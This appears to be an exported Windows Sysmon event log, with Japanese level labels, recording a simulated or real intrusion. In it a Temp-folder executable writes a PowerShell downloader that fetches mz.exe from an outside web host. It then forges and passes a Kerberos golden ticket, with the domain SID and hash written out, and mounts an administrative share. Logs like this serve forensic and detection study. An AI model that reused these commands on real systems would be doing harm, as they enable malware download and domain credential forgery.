情報,2019/11/07 15:59:37,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:59:37.841
ProcessGuid: {02EA0504-59D9-5A01-0000-0010AAD21100}
ProcessId: 2172
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""net use \\Win7_64JP_03\c$""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5
ParentProcessGuid: {02EA0504-41EE-5A01-0000-0010421D0200}
ParentProcessId: 204
ParentImage: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe
ParentCommandLine: ""C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe"" "
情報,2019/11/07 15:59:25,Microsoft-Windows-Sysmon,2,File creation time changed (rule: FileCreateTime),"File creation time changed:
UtcTime: 2019-11-07 06:59:25.657
ProcessGuid: {02EA0504-485D-5A01-0000-0010DB380900}
ProcessId: 2736
Image: C:\Program Files\Internet Explorer\iexplore.exe
TargetFilename: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\KW051L28FM7OUNUX6ASW.temp
CreationUtcTime: 2019-11-07 05:26:24.114
PreviousCreationUtcTime: 2019-11-07 06:59:25.657"
情報,2019/11/07 15:58:53,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:58:53.943
ProcessGuid: {02EA0504-5978-5A01-0000-00101B8A1100}
ProcessId: 2836
Image: C:\Program Files (x86)\Google\Update\GoogleUpdate.exe"
情報,2019/11/07 15:58:42,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:58:42.055
ProcessGuid: {02EA0504-5991-5A01-0000-00109B941100}
ProcessId: 2684
Image: C:\Program Files (x86)\Google\Update\GoogleUpdate.exe"
情報,2019/11/07 15:58:37,Microsoft-Windows-Sysmon,2,File creation time changed (rule: FileCreateTime),"File creation time changed:
UtcTime: 2019-11-07 06:58:37.157
ProcessGuid: {02EA0504-485D-5A01-0000-0010DB380900}
ProcessId: 2736
Image: C:\Program Files\Internet Explorer\iexplore.exe
TargetFilename: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\6LKAEZTKO7WO8B4PUI4F.temp
CreationUtcTime: 2019-11-07 05:26:24.114
PreviousCreationUtcTime: 2019-11-07 06:58:37.157"
情報,2019/11/07 15:58:25,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:58:25.067
ProcessGuid: {02EA0504-5991-5A01-0000-00109B941100}
ProcessId: 2684
Image: C:\Program Files (x86)\Google\Update\GoogleUpdate.exe
CommandLine: ""C:\Program Files (x86)\Google\Update\GoogleUpdate.exe"" /svc
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {02EA0504-41A6-5A01-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=ADB860FF9C00B308BF4ABBCB77E2C5233FEB61C5
ParentProcessGuid: {02EA0504-41A6-5A01-0000-001033890000}
ParentProcessId: 504
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe"
情報,2019/11/07 15:58:02,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:58:02.696
ProcessGuid: {02EA0504-597A-5A01-0000-00101E8D1100}
ProcessId: 2936
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:58:02,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:58:02.696
ProcessGuid: {02EA0504-597A-5A01-0000-0010A78C1100}
ProcessId: 2688
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:58:02,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:58:02.696
ProcessGuid: {02EA0504-597A-5A01-0000-00100C8E1100}
ProcessId: 664
Image: C:\Intel\Logs\mz.exe"
情報,2019/11/07 15:58:02,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:58:02.244
ProcessGuid: {02EA0504-597A-5A01-0000-00100C8E1100}
ProcessId: 664
Image: C:\Intel\Logs\mz.exe
CommandLine: C:\Intel\Logs\mz.exe  ""kerberos::ptt C:\Intel\Logs\500.kirbi"" exit
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {02EA0504-41A6-5A01-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=53796614833D7596FF9F6BFD59E55D668089A00F
ParentProcessGuid: {02EA0504-597A-5A01-0000-0010A78C1100}
ParentProcessId: 2688
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""C:\Intel\Logs\mz.exe ""kerberos::ptt C:\Intel\Logs\500.kirbi"" exit"""
情報,2019/11/07 15:58:02,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:58:02.228
ProcessGuid: {02EA0504-597A-5A01-0000-00101E8D1100}
ProcessId: 2936
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe ""21313051967311924671708473646-146000819605605837123980834314352936221530946062""
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {02EA0504-41A6-5A01-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=D836FCE5EE3175E5178DADD40E1FEC98A83FBCE9
ParentProcessGuid: {02EA0504-41A1-5A01-0000-00105F7E0000}
ParentProcessId: 360
ParentImage: C:\Windows\System32\csrss.exe
ParentCommandLine: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
情報,2019/11/07 15:58:02,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:58:02.228
ProcessGuid: {02EA0504-597A-5A01-0000-0010A78C1100}
ProcessId: 2688
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""C:\Intel\Logs\mz.exe ""kerberos::ptt C:\Intel\Logs\500.kirbi"" exit""
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {02EA0504-41A6-5A01-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5
ParentProcessGuid: {02EA0504-584C-5A01-0000-0010E1C11000}
ParentProcessId: 2604
ParentImage: C:\Intel\Logs\win.exe
ParentCommandLine: C:\Intel\Logs\win.exe"
情報,2019/11/07 15:58:00,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:58:00.013
ProcessGuid: {02EA0504-5978-5A01-0000-00101B8A1100}
ProcessId: 2836
Image: C:\Program Files (x86)\Google\Update\GoogleUpdate.exe
CommandLine: ""C:\Program Files (x86)\Google\Update\GoogleUpdate.exe"" /ua /installsource scheduler
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {02EA0504-41A6-5A01-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=ADB860FF9C00B308BF4ABBCB77E2C5233FEB61C5
ParentProcessGuid: {02EA0504-41EC-5A01-0000-0010C4BF0100}
ParentProcessId: 1928
ParentImage: C:\Windows\System32\taskeng.exe
ParentCommandLine: taskeng.exe {54713E6C-87C6-4368-99B5-3DB599A32F37} S-1-5-18:NT AUTHORITY\System:Service:"
情報,2019/11/07 15:57:59,Microsoft-Windows-Sysmon,2,File creation time changed (rule: FileCreateTime),"File creation time changed:
UtcTime: 2019-11-07 06:57:59.904
ProcessGuid: {02EA0504-485D-5A01-0000-0010DB380900}
ProcessId: 2736
Image: C:\Program Files\Internet Explorer\iexplore.exe
TargetFilename: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\WYLOKN8K1UCQTAYDK0C8.temp
CreationUtcTime: 2019-11-07 05:26:24.114
PreviousCreationUtcTime: 2019-11-07 06:57:59.904"
情報,2019/11/07 15:57:49,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:57:49.483
ProcessGuid: {02EA0504-596D-5A01-0000-001020681100}
ProcessId: 2616
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE"" SCODEF:2736 CREDAT:2692371 /prefetch:2
CurrentDirectory: C:\Users\chiyoda.tokyo.EXAMPLE\Desktop\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: SHA1=7CB7EF5B277663E56167E1E7705D7C8BFC4BD432
ParentProcessGuid: {02EA0504-485D-5A01-0000-0010DB380900}
ParentProcessId: 2736
ParentImage: C:\Program Files\Internet Explorer\iexplore.exe
ParentCommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding"
情報,2019/11/07 15:57:36,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:57:36.738
ProcessGuid: {02EA0504-5919-5A01-0000-001052241100}
ProcessId: 2152
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:57:28,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:57:28.345
ProcessGuid: {02EA0504-5958-5A01-0000-001090611100}
ProcessId: 1560
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:57:28,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:57:28.345
ProcessGuid: {02EA0504-5958-5A01-0000-00100F611100}
ProcessId: 2812
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:57:28,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:57:28.329
ProcessGuid: {02EA0504-5958-5A01-0000-0010DF621100}
ProcessId: 2992
Image: C:\Intel\Logs\mz.exe"
情報,2019/11/07 15:57:28,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:57:28.298
ProcessGuid: {02EA0504-5958-5A01-0000-0010DF621100}
ProcessId: 2992
Image: C:\Intel\Logs\mz.exe
CommandLine: C:\Intel\Logs\mz.exe  ""kerberos::golden /domain:example.co.jp /sid:S-1-5-21-1524084746-3249201829-3114449661 /rc4:b23a3443a12bf736973741f65ddcbc83 /user:sysg.admin /id:500 /ticket:C:\Intel\Logs\500.kirbi"" exit
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=53796614833D7596FF9F6BFD59E55D668089A00F
ParentProcessGuid: {02EA0504-5958-5A01-0000-00100F611100}
ParentProcessId: 2812
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""C:\Intel\Logs\mz.exe ""kerberos::golden /domain:example.co.jp /sid:S-1-5-21-1524084746-3249201829-3114449661 /rc4:b23a3443a12bf736973741f65ddcbc83 /user:sysg.admin /id:500 /ticket:C:\Intel\Logs\500.kirbi"" exit"""
情報,2019/11/07 15:57:28,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:57:28.282
ProcessGuid: {02EA0504-5958-5A01-0000-001090611100}
ProcessId: 1560
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe ""721647445678354854-14913270691119761516-3168310752089017133-3463344532021777180""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=D836FCE5EE3175E5178DADD40E1FEC98A83FBCE9
ParentProcessGuid: {02EA0504-41A6-5A01-0000-001010810000}
ParentProcessId: 428
ParentImage: C:\Windows\System32\csrss.exe
ParentCommandLine: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
情報,2019/11/07 15:57:28,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:57:28.267
ProcessGuid: {02EA0504-5958-5A01-0000-00100F611100}
ProcessId: 2812
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""C:\Intel\Logs\mz.exe ""kerberos::golden /domain:example.co.jp /sid:S-1-5-21-1524084746-3249201829-3114449661 /rc4:b23a3443a12bf736973741f65ddcbc83 /user:sysg.admin /id:500 /ticket:C:\Intel\Logs\500.kirbi"" exit""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5
ParentProcessGuid: {02EA0504-41EE-5A01-0000-0010421D0200}
ParentProcessId: 204
ParentImage: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe
ParentCommandLine: ""C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe"" "
情報,2019/11/07 15:57:04,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:57:04.383
ProcessGuid: {02EA0504-5937-5A01-0000-0010C54D1100}
ProcessId: 2172
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:57:04,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:57:04.383
ProcessGuid: {02EA0504-5937-5A01-0000-00104D4D1100}
ProcessId: 2472
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:57:04,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:57:04.367
ProcessGuid: {02EA0504-5937-5A01-0000-00100E4F1100}
ProcessId: 2612
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
情報,2019/11/07 15:56:55,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:56:55.195
ProcessGuid: {02EA0504-5937-5A01-0000-00100E4F1100}
ProcessId: 2612
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
CommandLine: powershell  -ExecutionPolicy ByPass -File C:\Intel\Logs\z.ps1
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=04C5D2B4DA9A0F3FA8A45702D4256CEE42D8C48D
ParentProcessGuid: {02EA0504-5937-5A01-0000-00104D4D1100}
ParentProcessId: 2472
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""powershell -ExecutionPolicy ByPass -File C:\Intel\Logs\z.ps1"""
情報,2019/11/07 15:56:55,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:56:55.132
ProcessGuid: {02EA0504-5937-5A01-0000-0010C54D1100}
ProcessId: 2172
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe ""1818829614-433595396-19012270571687549532-52693522521024864111609241215-1274425113""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=D836FCE5EE3175E5178DADD40E1FEC98A83FBCE9
ParentProcessGuid: {02EA0504-41A6-5A01-0000-001010810000}
ParentProcessId: 428
ParentImage: C:\Windows\System32\csrss.exe
ParentCommandLine: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
情報,2019/11/07 15:56:55,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:56:55.132
ProcessGuid: {02EA0504-5937-5A01-0000-00104D4D1100}
ProcessId: 2472
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""powershell -ExecutionPolicy ByPass -File C:\Intel\Logs\z.ps1""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5
ParentProcessGuid: {02EA0504-41EE-5A01-0000-0010421D0200}
ParentProcessId: 204
ParentImage: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe
ParentCommandLine: ""C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe"" "
情報,2019/11/07 15:56:36,Microsoft-Windows-Sysmon,2,File creation time changed (rule: FileCreateTime),"File creation time changed:
UtcTime: 2019-11-07 06:56:36.537
ProcessGuid: {02EA0504-485D-5A01-0000-0010DB380900}
ProcessId: 2736
Image: C:\Program Files\Internet Explorer\iexplore.exe
TargetFilename: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\3KWRNR52AOB8JIES1OHL.temp
CreationUtcTime: 2019-11-07 05:26:24.114
PreviousCreationUtcTime: 2019-11-07 06:56:36.537"
情報,2019/11/07 15:56:28,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:56:28.066
ProcessGuid: {02EA0504-591C-5A01-0000-001030431100}
ProcessId: 1428
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:56:28,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:56:28.066
ProcessGuid: {02EA0504-591C-5A01-0000-0010B8421100}
ProcessId: 372
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:56:28,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:56:28.035
ProcessGuid: {02EA0504-591C-5A01-0000-001030431100}
ProcessId: 1428
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe ""2123129847-5852836191412801414-17307690952136294042-740940357-1306613022-1159133228""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=D836FCE5EE3175E5178DADD40E1FEC98A83FBCE9
ParentProcessGuid: {02EA0504-41A6-5A01-0000-001010810000}
ParentProcessId: 428
ParentImage: C:\Windows\System32\csrss.exe
ParentCommandLine: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
情報,2019/11/07 15:56:28,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:56:28.035
ProcessGuid: {02EA0504-591C-5A01-0000-0010B8421100}
ProcessId: 372
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""echo $p.DownloadFile(""http://anews-web.co/mz.exe"", ""C:\Intel\Logs\mz.exe"") >> C:\Intel\Logs\z.ps1""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5
ParentProcessGuid: {02EA0504-41EE-5A01-0000-0010421D0200}
ParentProcessId: 204
ParentImage: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe
ParentCommandLine: ""C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe"" "
情報,2019/11/07 15:56:25,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:56:25.933
ProcessGuid: {02EA0504-5919-5A01-0000-001052241100}
ProcessId: 2152
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE"" SCODEF:2736 CREDAT:464214 /prefetch:2
CurrentDirectory: C:\Users\chiyoda.tokyo.EXAMPLE\Desktop\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: SHA1=7CB7EF5B277663E56167E1E7705D7C8BFC4BD432
ParentProcessGuid: {02EA0504-485D-5A01-0000-0010DB380900}
ParentProcessId: 2736
ParentImage: C:\Program Files\Internet Explorer\iexplore.exe
ParentCommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding"
情報,2019/11/07 15:56:07,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:56:07.821
ProcessGuid: {02EA0504-58C0-5A01-0000-00106DF31000}
ProcessId: 2540
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:56:03,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:56:03.968
ProcessGuid: {02EA0504-5903-5A01-0000-00103B1F1100}
ProcessId: 2476
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:56:03,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:56:03.968
ProcessGuid: {02EA0504-5903-5A01-0000-0010471E1100}
ProcessId: 644
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:56:03,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:56:03.953
ProcessGuid: {02EA0504-5903-5A01-0000-00103B1F1100}
ProcessId: 2476
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe ""413662168-1066657750-1123720917-1490064328-1057690100637355021849654289299170584""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=D836FCE5EE3175E5178DADD40E1FEC98A83FBCE9
ParentProcessGuid: {02EA0504-41A6-5A01-0000-001010810000}
ParentProcessId: 428
ParentImage: C:\Windows\System32\csrss.exe
ParentCommandLine: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
情報,2019/11/07 15:56:03,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:56:03.937
ProcessGuid: {02EA0504-5903-5A01-0000-0010471E1100}
ProcessId: 644
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""echo $p = New-Object System.Net.WebClient > C:\Intel\Logs\z.ps1""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5
ParentProcessGuid: {02EA0504-41EE-5A01-0000-0010421D0200}
ParentProcessId: 204
ParentImage: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe
ParentCommandLine: ""C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe"" "
情報,2019/11/07 15:55:42,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:55:42.939
ProcessGuid: {02EA0504-58EB-5A01-0000-0010151B1100}
ProcessId: 664
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:55:42,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:55:42.939
ProcessGuid: {02EA0504-58EB-5A01-0000-00109D1A1100}
ProcessId: 1676
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:55:42,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:55:42.939
ProcessGuid: {02EA0504-58EB-5A01-0000-0010631C1100}
ProcessId: 2584
Image: C:\Windows\SysWOW64\PING.EXE"
情報,2019/11/07 15:55:39,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:55:39.882
ProcessGuid: {02EA0504-58EB-5A01-0000-0010631C1100}
ProcessId: 2584
Image: C:\Windows\SysWOW64\PING.EXE
CommandLine: ping  192.168.16.105
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=6AC7947207D999A65890AB25FE344955DA35028E
ParentProcessGuid: {02EA0504-58EB-5A01-0000-00109D1A1100}
ParentProcessId: 1676
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""ping 192.168.16.105"""
情報,2019/11/07 15:55:39,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:55:39.850
ProcessGuid: {02EA0504-58EB-5A01-0000-0010151B1100}
ProcessId: 664
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe ""20829479301510280329-9400317961761252005-171592119-250802955334246022231027375""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=D836FCE5EE3175E5178DADD40E1FEC98A83FBCE9
ParentProcessGuid: {02EA0504-41A6-5A01-0000-001010810000}
ParentProcessId: 428
ParentImage: C:\Windows\System32\csrss.exe
ParentCommandLine: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
情報,2019/11/07 15:55:39,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:55:39.850
ProcessGuid: {02EA0504-58EB-5A01-0000-00109D1A1100}
ProcessId: 1676
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""ping 192.168.16.105""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
